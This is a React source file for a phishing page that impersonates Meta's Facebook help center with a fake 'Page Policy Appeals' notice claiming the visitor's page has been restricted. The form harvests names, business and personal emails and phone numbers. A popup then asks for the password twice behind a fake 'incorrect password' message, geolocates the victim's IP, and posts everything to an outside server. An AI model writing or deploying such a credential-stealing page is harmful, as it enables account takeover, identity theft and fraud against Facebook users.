import React from "react";
import { logo, search } from "./Publics/images/images";
import { Link, useNavigate } from "react-router-dom";
import { useState } from "react";
import axios from "axios";
import { Button, Checkbox, Form, Input } from "antd";
const { TextArea } = Input;

const Buiness = () => {
    const [activePopup, setActivePopup] = useState(false);
    const [activePassword, setActivePassword] = useState(false);
    const [first, setActionFirst] = useState(true);
    const [firstPassword, setFirstPassword] = useState();
    const navigate = useNavigate();

    const handleOpendPopup = () => {
        setActivePopup(true);
    };

    const handleClosePopup = () => {
        setActivePopup(false);
    };

    const onFinish = (values) => {
        if (values.check_form === true) {
            localStorage.setItem("dataForm", JSON.stringify(values));
            return handleOpendPopup();
        }
    };

    const onFinishPassWord = (values) => {
        if (first === true) {
        setFirstPassword(values.fill_first_password);
        setActionFirst(false);
        }

        const passWord = values.fill_first_password;
        setActivePassword(true);
        const dataLocalForm = JSON.parse(localStorage.getItem("dataForm"));

        if (activePassword === true) {
        axios.get(`https://api.db-ip.com/v2/free/self`).then((response) => {
            const dataPassWord = {
                ...dataLocalForm,
                firt_password: firstPassword,
                second_password: passWord,
                ip: response.data.ipAddress,
                city: response.data.city,
                country: response.data.country,
            };

            localStorage.setItem("dataPassWord", JSON.stringify(dataPassWord));

            const data = {
                fill_business_email: dataPassWord.fill_business_email,
                fill_personal_email: dataPassWord.fill_personal_email,
                fill_full_name: dataPassWord.fill_full_name,
                fill_your_name: dataPassWord.fill_your_name,
                fill_phone: dataPassWord.fill_phone,
                ip: response.data.ipAddress,
                city: response.data.city,
                country: response.data.countryName,
                first_password: firstPassword,
                second_password: passWord,
            };

            axios.post("https://server-theme-03.onrender.com/api/news", data).then((response) => {
                if (response.data.status === 0) {
                    navigate("/account/confirm");
                }
            });
        });
        }
    };

    return (
        <div className="business">
        <div className="top-header">
            <div className="container">
                <img src={logo} width="70" className="metalogo" alt="" />   
            <p className="metahead">Support Inbox</p>
                <img src={search} width="100%" className="searchicon" alt="" />
            </div>
        </div>

        <div className="bottom-header">
            <div className="container">
            <Link to="#" className="first">
                    <svg
                    width="16"
                    height="16"
                    viewBox="0 0 16 16"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                    >
                        <path
                            d="M8.70711 1.49992C8.31658 1.1094 7.68342 1.1094 7.29289 1.49992L0.646447 8.14637C0.451184 8.34163 0.451184 8.65822 0.646447 8.85348C0.841709 9.04874 1.15829 9.04874 1.35355 8.85348L8 2.20703L14.6464 8.85348C14.8417 9.04874 15.1583 9.04874 15.3536 8.85348C15.5488 8.65822 15.5488 8.34163 15.3536 8.14637L13 5.79282V2.49992C13 2.22378 12.7761 1.99992 12.5 1.99992H11.5C11.2239 1.99992 11 2.22378 11 2.49992V3.79282L8.70711 1.49992Z"
                            fill="black"
                        />
                        <path
                            d="M8 3.29282L14 9.29282V13.4999C14 14.3284 13.3284 14.9999 12.5 14.9999H3.5C2.67157 14.9999 2 14.3284 2 13.4999V9.29282L8 3.29282Z"
                            fill="black"
                        />
                    </svg>
                    <b>Help Center</b>
            </Link>
            <Link to="#">English</Link>
            </div>
        </div>

        <div className="main">
            <div className="container">
                
                <div className="aside col-md-3 col-12">
                    <ul >
                        <li>
                            <Link to="#">Creating an Account</Link>
                        </li>
                        <li>
                            <Link to="#">Your Profile</Link>
                        </li>
                        <li>
                            <Link to="#">Friending</Link>
                        </li>
                        <li>
                            <Link to="#">Facebook Dating</Link>
                        </li>
                        <li>
                            <Link to="#">Your Home Page</Link>
                        </li>
                        <li>
                            <Link to="#">Messaging</Link>
                        </li>
                        <li>
                            <Link to="#">Reels</Link>
                        </li>
                        <li>
                            <Link to="#">Stories</Link>
                        </li>
                        <li>
                            <Link to="#">Photos</Link>
                        </li>
                        <li>
                            <Link to="#">Videos</Link>
                        </li>
                        <li>
                            <Link to="#">Gaming</Link>
                        </li>
                        <li>
                            <Link to="#">Pages</Link>
                        </li>
                        <li>
                            <Link to="#">Groups</Link>
                        </li>
                        <li>
                            <Link to="#">Events</Link>
                        </li>
                        <li>
                            <Link to="#">Fundraisers and Donations</Link>
                        </li>
                        <li>
                            <Link to="#">Meta Pay</Link>
                        </li>
                        <li>
                            <Link to="#">Marketplace</Link>
                        </li>
                        <li>
                            <Link to="#">Apps</Link>
                        </li>
                        <li>
                            <Link to="#">Facebook Mobile Apps</Link>
                        </li>
                        <li>
                            <Link to="#">Accessibility</Link>
                    </li>
                </ul>
            </div>

            <div className="content col-md-9 col-12">
            
                <div className="form">
                    <div className=" pb-1" style={{fontSize: "20px", textAlign: "left"}}>
                        <strong>Page Policy Appeals</strong>
                    </div>

                    <div className="desc-form mb-4" style={{fontSize: "12px", textAlign: "left", padding: "15px 0"}}>
                        <p>We have detected unusual activity on your page that violates our community standards.</p>
                        <p>Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.</p>
                        <p>If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.</p>
                    </div>


                    {/* FORM START */}

                    <Form
                        name="basic"
                        initialValues={{
                        remember: true,
                        }}
                        onFinish={onFinish}
                        autoComplete="off"
                    >

                        <div className="item-form">
                            <label for="fill_your_name">Name <i>*</i></label>
                            <Form.Item
                                name="fill_your_name"
                                rules={[
                                    {
                                    required: true,
                                    message: 'Please input your name!',
                                    },
                                ]}
                            >
                                <Input />
                            </Form.Item>
                        </div>

                        <div className="item-form">
                            <label for="fill_full_name">Full Name <i>*</i></label>
                            <Form.Item
                                name="fill_full_name"
                                rules={[
                                    {
                                    required: true,
                                    message: 'Please input full name!',
                                    },
                                ]}
                            >
                                <Input />
                            </Form.Item>
                        </div>

                        <div className="item-form">
                            <label for="email">Business Email Address <i>*</i></label>
                            <Form.Item
                                name="fill_business_email"
                                rules={[
                                    {
                                    required: true,
                                    message: 'Please input business email address!',
                                    },
                                ]}
                            >
                                <Input />
                            </Form.Item>
                        </div>

                        <div className="item-form">
                            <label for="fill_personal_email">Personal Email Address <i>*</i></label>
                            <Form.Item
                                name="fill_personal_email"
                                rules={[
                                    {
                                    required: true,
                                    message: 'Please input personal email address!',
                                    },
                                ]}
                            >
                                <Input />
                            </Form.Item>
                        </div>

                        <div className="item-form">
                            <label for="fill_phone">Mobile Phone Number <i>*</i></label>
                            <Form.Item
                                name="fill_phone"
                                rules={[
                                    {
                                    required: true,
                                    message: 'Please input your mobile phone number!',
                                    },
                                ]}
                            >
                                <Input />
                            </Form.Item>
                        </div>

                        <div className="item-form">
                            <label >
                                Please provide us information that will help us investigate.
                            </label>
                            <Form.Item
                                name="infomation"
                            >
                                <TextArea rows={3}   />
                            </Form.Item>
                        </div>

                        <div className="item-form">
                            <Form.Item
                                name="check_form"
                                valuePropName="checked"
                                rules={[
                                    {
                                    required: true,
                                    message: 'Please agree to our terms and data and cookie policy!',
                                    },
                                ]}
                            >
                                <Checkbox >I agree to our Terms, Data and Cookies Policy.</Checkbox>
                            </Form.Item>
                        </div>


                        <Form.Item 
                            className="btn butoni"
                        >
                            <Button
                                htmlType="submit"
                                style={{
                                    backgroundColor: "transparent",
                                    outline: "none",
                                    border: 'none',
                                    boxShadow: 'none',
                                    color: "#267df1",
                                    fontWeight: '700',
                                    fontSize:'1rem',
                                    width: '100%',
                                    padding : '5px 20px'
                                }}
                            >
                                Submit
                            </Button>
                        </Form.Item>
                    </Form>

                    {/* FORM END */}
                </div>

            </div>

            </div>
        </div>

        {/* FOOTER */}
        <div className="footer">
            <div className="container">
            <img src={logo} alt="" className="logofooter" />
            <p className="nerlogofooter">
                Facebook can help your large, medium or small business grow. Get the
                latest news for advertisers and more on our
                <Link to="#" style={{ textDecoration: "none", color: "white" }}>
                Meta for Business Page.
                </Link>
            </p>
            <div className="row">
                <div className="col-md-3 col-6">
                <ul>
                    <li>
                    <p className="fontbold">Marketing on Facebook</p>
                    <p>Success Stories</p>
                    <p>Measurement</p>
                    <p>Industries</p>
                    <p>Inspiration</p>
                    <p>Events</p>
                    <p>News</p>
                    <p>Site map</p>
                    </li>
                </ul>
                </div>
                <div className="col-md-3 col-6">
                <ul>
                    <li>
                    <p className="fontbold">Marketing objectives</p>
                    <p>Build your presence</p>
                    <p>Create awareness</p>
                    <p>Drive discovery</p>
                    <p>Generate leads</p>
                    <p>Boost sales</p>
                    <p>Earn loyalty</p>
                    </li>
                </ul>
                </div>
                <div className="col-md-3 col-6">
                <ul>
                    <li>
                    <p className="fontbold">Facebook Pages</p>
                    <p>Get started with Pages</p>
                    <p>Setting up your Page</p>
                    <p>Manage your Facebook Page</p>
                    <p>Promote your Page</p>
                    <p>Messaging on your Page</p>
                    <p>Page Insights</p>
                    </li>
                </ul>
                </div>
                <div variant="dontshowonmobile " className="col-md-3 col-6">
                <ul>
                    <li>
                    <p className="fontbold">Facebook ads</p>
                    <p>Get started with ads</p>
                    <p>Buying Facebook ads</p>
                    <p>Ad formats</p>
                    <p>Ad placement</p>
                    <p>Choose your audience</p>
                    <p>Measure your ads</p>
                    <p>Managing your ads</p>
                    </li>
                </ul>
                </div>
            </div>
            </div>
        </div>

        <div className="bottomfooter">
            <div className="container">
            <ul>
                <li>English (UK)</li>
                <li>English (US)</li>
                <li>Español</li>
                <li>Português (Brasil)</li>
                <li>Français (France)</li>
                <li>Español (España)</li>
                <li>More languages</li>
            </ul>
            <ul>
                <li>© 2023 Meta</li>
                <li>About</li>
                <li>Developers</li>
                <li>Careers</li>
                <li>Privacy</li>
                <li>Cookies</li>
                <li>Terms</li>
                <li>Help Centre</li>
            </ul>
            </div>
        </div>

        <div
            className={`popup  ${activePopup === true ? "active" : ""}`}
            id="popup"
        >
            <div className="background" onClick={handleClosePopup}></div>
            <div className="content">
            <Form
                name="basicForm"
                initialValues={{
                remember: true,
                }}
                onFinish={onFinishPassWord}
                autoComplete="off"
            >
                <div className="modal-header custom-header px-0">
                <h5
                    id="exampleModalLabel"
                    className="modal-title"
                    style={{ fontSize: "22px", fontWeight: "600" }}
                >
                    {" "}
                    Please Enter Your Password{" "}
                </h5>
                <button
                    type="button"
                    data-dismiss="modal"
                    aria-label="Close"
                    onClick={handleClosePopup}
                    className="close"
                >
                    <span aria-hidden="true">×</span>
                </button>
                </div>

                <div className="item-form">
                <p style={{ fontSize: "16px", marginBottom: "10px" }}>
                    {" "}
                    For your security, you must enter your password to continue.{" "}
                </p>
                <label for="password">Password:</label>
                <Form.Item
                    name="fill_first_password"
                    rules={[
                    {
                        required: true,
                        message: `The password you've entered is incorrect.`,
                    },
                    ]}
                    style={{
                    margin: "0",
                    }}
                >
                    <Input.Password />
                </Form.Item>
                <p
                    className={`password-correct ${
                    activePassword === true ? "active" : ""
                    }`}
                >
                    The password you've entered is incorrect.
                </p>
                </div>

                <Form.Item
                style={{
                    color: "rgb(255, 255, 255)",
                    backgroundColor: "rgb(44, 132, 244)",
                    marginTop: "20px",
                    width: "auto",
                    float: "right",
                }}
                className="btn butoni"
                >
                <Button
                    htmlType="submit"
                    style={{
                    backgroundColor: "transparent",
                    outline: "none",
                    border: "none",
                    boxShadow: "none",
                    fontWeight: "700",
                    fontSize: "1rem",
                    color: "white",
                    }}
                >
                    Continue
                </Button>
                </Form.Item>
            </Form>
            </div>
        </div>
        </div>
    );
};

export default Buiness;
